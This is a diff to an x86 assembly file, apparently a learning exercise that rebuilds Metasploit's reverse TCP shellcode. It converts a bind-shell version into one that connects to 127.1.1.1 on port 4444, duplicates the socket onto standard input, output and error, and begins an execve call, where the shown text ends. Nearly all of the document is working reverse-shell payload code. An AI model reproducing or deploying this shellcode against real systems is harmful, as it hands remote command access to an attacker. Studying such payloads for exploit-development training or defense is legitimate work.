@@ -3,11 +3,8 @@
 ; +==-------------------------------------==+
 ; | Author:  sp1icer                        |
 ; | Purpose: Build my own working demo of   |
-; |             the shell_bind_tcp          |
+; |             the shell_reverse_tcp       |
 ; |             shellcode in Metasploit.    |
-; |             For comments and            |
-; |             explanation, see the        |
-; |             bind.nasm file.             |
 ; +==-------------------------------------==+
 
 global _start
@@ -16,9 +13,10 @@ section .text
 _start:
 	push BYTE 0x66
 	pop eax
-	inc ebx
+	xor ebx, ebx
+	inc ebx	
 	xor edi, edi
-	push edi
+	push edi 
 	push 0x1
 	push 0x2
 	mov ecx, esp
@@ -26,43 +24,30 @@ _start:
 	mov esi, eax
 	push BYTE 0x66
 	pop eax
-	inc ebx
-	push edi
-	push WORD 0x8605
+	mov bl, 0x3
+	push DWORD 0x0101017F
+	push WORD 0x5c11
 	push WORD 0x2
 	mov ecx, esp
-	push BYTE 0x10
+	push BYTE 0x10	
 	push ecx
 	push esi
 	mov ecx, esp
+	push BYTE 0x10
+	pop edx	
 	int 0x80
-	push BYTE 0x66
+	push BYTE 0x3F
 	pop eax
-	inc ebx
-	inc ebx
-	push edi
 	push esi
-	mov ecx, esp
-	int 0x80
-	push 0x66
-	pop eax
-	inc ebx
-	push edi
-	push edi
-	push esi
-	mov ecx, esp
-	int 0x80
-	push eax
 	pop ebx
 	xor ecx, ecx
-loopTime:
-	mov al, 0x3F
 	int 0x80
+	mov al, 0x3F
 	inc ecx
-	cmp ecx, 0x3
-	jl short loopTime
-	jmp short elseTime
-elseTime:
+	int 0x80
+	mov al, 0x3F
+	inc ecx
+	int 0x80
 	push 0xB
 	pop eax
 	xor ebx, ebx
